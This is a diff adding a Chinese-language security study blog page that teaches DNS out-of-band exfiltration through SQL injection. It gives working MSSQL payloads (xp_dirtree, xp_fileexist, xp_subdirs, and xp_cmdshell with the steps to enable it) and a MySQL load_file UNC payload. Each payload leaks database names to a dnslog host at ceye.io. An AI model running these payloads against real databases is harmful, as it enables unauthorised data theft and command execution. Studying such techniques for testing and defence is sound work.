@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head><meta name="generator" content="Hexo 3.9.0">
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!--Description-->
+    
+        <meta name="description" content="SQLServer12345windows下 “ //域名请求”  会发送网络请求盲注情况下，利用DNS外带查询方式快速获取数据。MSSQL下，可以利用自带的存储过程或创建自定义的存储过程，向外发送网络请求。并利用dnslog接收外传的数据。
+
+前提1可以执行多语句操作
+
+四种外带数据所用函数：xp">
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="xxxmd5">
+    
+
+    <!--Open Graph Title-->
+    
+        <meta property="og:title" content="攻击手法5--DNSLOG外带数据">
+    
+
+    <!--Open Graph Description-->
+    
+
+    <!--Open Graph Site Name-->
+    <meta property="og:site_name" content="XMD5 STUDY BLOG">
+
+    <!--Type page-->
+    
+        <meta property="og:type" content="article">
+    
+
+    <!--Page Cover-->
+    
+
+    <meta name="twitter:card" content="summary">
+    
+
+    <!-- Title -->
+    
+    <title>攻击手法5--DNSLOG外带数据 - XMD5 STUDY BLOG</title>
+
+    <!-- Tachyons Core CSS -->
+    <link rel="stylesheet" href="https://unpkg.com/tachyons/css/tachyons.min.css">
+
+    <!-- Custom Fonts -->
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/style.css">
+
+    <!-- Google Analytics -->
+    
+
+
+</head>
+
+
+<body>
+
+<!-- Main Content -->
+<!-- Banner -->
+<!-- Banner -->
+<div class="w-100 bg-1 ph5-ns ph3 text-light">
+    
+    <nav class="db dt-l w-100 mw8 center border-box pv3">
+        <a class="db dtc-l v-mid link dim w-100 w-25-l tc tl-l mb2 mb0-l white" href="/" title="XMD5 STUDY BLOG">
+            <img src="http://www.codeblocq.com/assets/projects/hexo-theme-anodyne/assets/anodyne.svg" class="dib h3" alt="XMD5 STUDY BLOG">
+        </a>
+        <div class="db dtc-l v-mid w-100 w-75-l tc tr-l">
+            
+                <a class="link dim f6 f5-l dib mr3 mr4-l white" 
+                    href="/" 
+                    title="主页">
+                    主页
+                </a>
+            
+                <a class="link dim f6 f5-l dib mr3 mr4-l white" 
+                    href="/archives" 
+                    title="归档">
+                    归档
+                </a>
+            
+        </div>
+    </nav>
+
+    <!-- Title -->
+    <div class="w-100 mw8 center vh-40 dt">
+        <div class="dtc v-mid white">
+            <h1 class="f1-l f2-m tc tc-m tl-ns">攻击手法5--DNSLOG外带数据</h1>
+            <p class="f4 fw3 pab-100px tc tc-m tl-ns">2019-08-25</p>
+        </div>
+    </div>
+
+    <!-- Icon -->
+    <div class="relative w-100 mw8 center white dn dn-m db-ns">
+        <i class="header-icon fa fa-file-text-o"></i>
+    </div>
+</div>
+
+<!-- Content -->
+<div class="w-100 ph2 ph4-m ph5-l mv5 mv6-l">
+    <div class="content">
+        <div class="mw8 center">
+            <div class="cf">
+                <div class="fl w-100 w-70-l mw7 left fw3 lh-copy pr4-ns pr0-m post-content">
+                    <!-- Tags Vertical -->
+                    
+                        <div class="tags-container-vertical">
+                            <div class="tags-sub-container">
+                                <a class="fw3 ph1 dib" href="/tags/mssql-mysql-sql注入/">#mssql,mysql,sql注入</a>
+                            </div>
+                        </div>
+                    
+
+                    <!-- Main Post Content -->
+                    <h2 id="SQLServer"><a href="#SQLServer" class="headerlink" title="SQLServer"></a>SQLServer</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">windows下 “ //域名请求”  会发送网络请求</span><br><span class="line"></span><br><span class="line">盲注情况下，利用DNS外带查询方式快速获取数据。</span><br><span class="line"></span><br><span class="line">MSSQL下，可以利用自带的存储过程或创建自定义的存储过程，向外发送网络请求。并利用dnslog接收外传的数据。</span><br></pre></td></tr></table></figure>
+
+<h4 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">可以执行多语句操作</span><br></pre></td></tr></table></figure>
+
+<h4 id="四种外带数据所用函数："><a href="#四种外带数据所用函数：" class="headerlink" title="四种外带数据所用函数："></a>四种外带数据所用函数：</h4><pre><code>xp_subdirs、xp_dirtree、xp_fileexist 和 xp_cmdshell
+前三个存储过程的效果和使用方式几乎一致。
+xp_cmdshell要求必须为DBA权限才可使用。</code></pre><h4 id="利用手法分三步，操作多语句进行结合使用"><a href="#利用手法分三步，操作多语句进行结合使用" class="headerlink" title="利用手法分三步，操作多语句进行结合使用"></a>利用手法分三步，操作多语句进行结合使用</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">DECLARE @v varchar(1024); //先定义一个变量</span><br><span class="line">  set @v = db_name(); //设置变量的值</span><br><span class="line">  //执行函数，外带数据进行操作</span><br><span class="line">  exec(&apos;**master..xp_dirtree** &quot;//&apos; %2B @v %2B &apos;.dns.ceye.io/a&quot;&apos;)</span><br><span class="line">  exec(&apos;**master..xp_fileexist** &quot;//&apos; %2B @a %2B &apos;.dns.ceye.io/a&quot;&apos;)</span><br><span class="line">  exec(&apos;**master..xp_subdirs** &quot;//&apos; %2B @a %2B &apos;.dns.ceye.io/a&quot;&apos;)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Example:</span><br><span class="line">   select 1 ; declare @a varchar(1024);set @a=(select top 1 name from 	</span><br><span class="line">   master..sysdatabases where name not in (select top 0 name from 	 </span><br><span class="line">   master..sysdatabases));exec(&apos;master..xp_dirtree &quot;//&apos; %2B @a %2B &apos;.dns.ceye.io/a&quot;&apos;)--</span><br><span class="line"></span><br><span class="line">   select 1 ; declare @a varchar(1024);set @a=(select top 1 name from </span><br><span class="line">   master..sysdatabases where name not in (select top 1 name from </span><br><span class="line">   master..sysdatabases));exec(&apos;master..xp_fileexist &quot;//&apos; %2B @a %2B &apos;.dns.ceye.io/a&quot;&apos;)--</span><br><span class="line"></span><br><span class="line">   select 1 ; declare @a varchar(1024);set @a=(select top 1 name from</span><br><span class="line">   master..sysdatabases where name not in (select top 2 name from </span><br><span class="line">   master..sysdatabases));exec(&apos;master..xp_subdirs &quot;//&apos; %2B @a %2B &apos;.dns.ceye.io/a&quot;&apos;)--</span><br></pre></td></tr></table></figure>
+
+<h5 id="xp-cmdshell要求必须为DBA权限才可使用。"><a href="#xp-cmdshell要求必须为DBA权限才可使用。" class="headerlink" title="xp_cmdshell要求必须为DBA权限才可使用。"></a>xp_cmdshell要求必须为DBA权限才可使用。</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">xp_cmdshell执行系统命令 读数据，执行命令直接写webshell</span><br><span class="line">   要先修改配置，开启xp_cmdshell</span><br><span class="line">   sp_configure &apos;show advanced options&apos;,1 //更改show advanced options的值为1</span><br><span class="line">   reconfigure</span><br><span class="line">   go   //重新配置指令，和reconfugure一起使用，分行放</span><br><span class="line">   sp_configure &apos;xp_cmdshell&apos;,1  //设置cmdshell的值为1</span><br><span class="line">   reconfigure</span><br><span class="line">   Go</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">select 1 ; declare @a varchar(1024);set @a=(select top 1 name from </span><br><span class="line">   master..sysdatabases where name not in (select **top 0** name from</span><br><span class="line">   master..sysdatabases));exec(&apos;**master..xp_cmdshell** &quot;ping &apos; %2B @a %2B</span><br><span class="line">   &apos;.dns.ceye.io&quot;&apos;)--  </span><br><span class="line">   //ping后面有空格</span><br></pre></td></tr></table></figure>
+
+<h2 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h2><h4 id="前提-1"><a href="#前提-1" class="headerlink" title="前提"></a>前提</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql的secure_file_priv的设置为 secure_file_priv=&apos;&apos;</span><br><span class="line"></span><br><span class="line">必须在windows系统中操作</span><br><span class="line">原因：    </span><br><span class="line">	load_file函数在Linux下是无法用来做dnslog攻击的，因为在这里就涉及到Windows的UNC路径。</span><br><span class="line">   UNC是一种命名惯例, 主要用于在Microsoft Windows上指定和映射网络驱动器. UNC命名惯例最多被应用			于在局域网中访问文件服务器或者打印机。我们日常常用的网络共享文件就是这个方式。</span><br><span class="line">       因为Linux没有UNC路径这个东西，所以当MySQL处于Linux系统中的时候，是不能使用这种方式外带数据。</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">利用load_file(‘path’)读文件的功能，给mysql提供路径，mysql将路径交给系统，系统去打开远程文件</span><br><span class="line"></span><br><span class="line">添加payload，使用dnslog外带数据，查询库名</span><br><span class="line">select 1 and (select load_file(concat(&apos;\\\\&apos;,(select schema_name from </span><br><span class="line">   information_schema.schemata limit 0,1),&apos;.dns.ceye.io\\a&apos;)))-- x</span><br></pre></td></tr></table></figure>
+                    
+                    <!-- Tags Bottom -->
+                    
+                        <div class="tags-container-bottom">
+                            <i class="fa fa-tag pr3 text-main-color"></i><a class="fw3 ph1 dib" href="/tags/mssql-mysql-sql注入/">#mssql,mysql,sql注入</a>
+                        </div>
+                    
+
+                    <!-- Comments -->
+                    
+
+
+
+                </div>
+                <div class="fl w-100 w-30-l center fw3 lh-copy pl4-ns tl black-50">
+                    
+                    <hr class="dn-l mw4 black-50 mt5" />
+                    
+                    <!-- Widget 1: About -->
+                    <div class="mt5 mt0-l">
+    <article class="dt db-l mw8 mw8-m mw5-ns center ml0-l bg-white mv3">
+        <div class="dn dtc-m db-l v-mid tc pr4 pr0-l" style="min-width: 6rem;">
+            <img src="https://ss0.bdstatic.com/70cFvHSh_Q1YnxGkpoWK1HF6hhy/it/u=3178292787,3619418245&fm=26&gp=0.jpg" class="mb4-l br-100 h3 w3 h4-l w4-l dib" title="xxxmd5">
+        </div>
+        <div class="dtc db-l v-mid lh-copy measure center f6 black-50 tj">
+            本人很懒
+        </div>
+    </article>
+</div>
+
+                    <hr class="dn-l mw4 black-50 mt5" />
+                    
+                    <!-- Widget 2: Categories -->
+                    
+
+                    <!-- Widget 3: Recent Posts -->
+                    <div class="mt5 tc tl-l">
+    <h3>Recent Posts</h3>
+    
+        <p>
+            <a href="/2019/08/25/20190825/">攻击手法5--DNSLOG外带数据</a>
+        </p>
+    
+        <p>
+            <a href="/2019/08/23/20190823/">攻击手法4--时间延时盲注</a>
+        </p>
+    
+        <p>
+            <a href="/2019/08/21/20190821/">攻击手法3---Bool盲注</a>
+        </p>
+    
+        <p>
+            <a href="/2019/08/19/20190819/">攻击手法2---报错注入</a>
+        </p>
+    
+        <p>
+            <a href="/2019/08/17/20190817/">攻击手法1---Union联合查询</a>
+        </p>
+    
+</div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+<!-- Footer -->
+<div class="bg-1 ph2 ph5-ns pv5">
+        <div class="mv8">
+            <div class="center tc">
+                
+                    <div class="dib mh3">
+                        <a class="f3 f2-ns white dim" href="https://github.com/XXXMD5" target="_blank">
+                            <i class="fa fa-github"></i>
+                        </a>
+                    </div>
+                
+                    <div class="dib mh3">
+                        <a class="f3 f2-ns white dim" href="/#" target="_blank">
+                            <i class="fa fa-rss"></i>
+                        </a>
+                    </div>
+                
+            </div>
+            <div class="f6 f5-ns center tc white pt5 fw3">
+                Take the world! | All right reserved
+            </div>
+        </div>
+    </div>
+
+<!-- After Footer -->
+<!-- Disqus Comments -->
+
+
+
+</body>
+
+</html>
